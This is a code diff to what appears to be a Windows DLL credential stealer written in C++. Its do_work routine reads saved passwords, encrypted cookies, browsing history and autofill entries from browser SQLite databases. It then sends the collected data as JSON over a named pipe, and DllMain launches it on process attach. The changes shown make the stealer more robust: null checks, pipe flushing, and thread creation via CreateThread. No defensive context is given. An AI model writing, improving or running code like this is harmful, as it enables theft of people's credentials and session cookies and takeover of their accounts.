@@ -291,8 +291,10 @@ void do_work() {
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
-                        std::string url = (char*)sqlite3_column_text(stmt, 0);
-                        std::string user = (char*)sqlite3_column_text(stmt, 1);
+                        const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_user = (const char*)sqlite3_column_text(stmt, 1);
+                        std::string url = t_url ? t_url : "";
+                        std::string user = t_user ? t_user : "";
                         const unsigned char* pass_blob = (const unsigned char*)sqlite3_column_blob(stmt, 2);
                         int pass_len = sqlite3_column_bytes(stmt, 2);
                         std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);
@@ -321,8 +323,10 @@ void do_work() {
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
-                        std::string host = (char*)sqlite3_column_text(stmt, 0);
-                        std::string name = (char*)sqlite3_column_text(stmt, 1);
+                        const char* t_host = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_name = (const char*)sqlite3_column_text(stmt, 1);
+                        std::string host = t_host ? t_host : "";
+                        std::string name = t_name ? t_name : "";
                         const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 2);
                         int enc_len = sqlite3_column_bytes(stmt, 2);
                         std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);
@@ -354,7 +358,9 @@ void do_work() {
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
-                        p_data.history.push_back({ (char*)sqlite3_column_text(stmt, 0), (char*)sqlite3_column_text(stmt, 1), sqlite3_column_int(stmt, 2) });
+                        const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_title = (const char*)sqlite3_column_text(stmt, 1);
+                        p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", sqlite3_column_int(stmt, 2) });
                     }
                     sqlite3_finalize(stmt);
                 }
@@ -373,7 +379,9 @@ void do_work() {
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, nullptr) == SQLITE_OK) {
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
-                        p_data.autofill.push_back({ (char*)sqlite3_column_text(stmt, 0), (char*)sqlite3_column_text(stmt, 1) });
+                        const char* t_name = (const char*)sqlite3_column_text(stmt, 0);
+                        const char* t_val = (const char*)sqlite3_column_text(stmt, 1);
+                        p_data.autofill.push_back({ t_name ? t_name : "", t_val ? t_val : "" });
                     }
                     sqlite3_finalize(stmt);
                 }
@@ -403,10 +411,11 @@ void do_work() {
         Sleep(200);
     }
     if (h_pipe != INVALID_HANDLE_VALUE) {
-        log_to_file("Connected to named pipe. Sending data...");
         std::string s = collected.dump();
+        log_to_file("Connected to named pipe. Attempting to send " + std::to_string(s.size()) + " bytes...");
         DWORD written;
-        if (WriteFile(h_pipe, s.c_str(), s.size(), &written, nullptr)) {
+        if (WriteFile(h_pipe, s.c_str(), (DWORD)s.size(), &written, nullptr)) {
+            FlushFileBuffers(h_pipe);
             log_to_file("Data sent successfully: " + std::to_string(written) + " bytes.");
         } else {
             log_to_file("Error sending data via pipe: " + std::to_string(GetLastError()));
@@ -422,9 +431,15 @@ void do_work() {
     }
 }
 
+DWORD WINAPI thread_func(LPVOID) {
+    do_work();
+    return 0;
+}
+
 extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        std::thread(do_work).detach();
+        HANDLE hThread = CreateThread(NULL, 0, thread_func, NULL, 0, NULL);
+        if (hThread) CloseHandle(hThread);
     }
     return TRUE;
 }
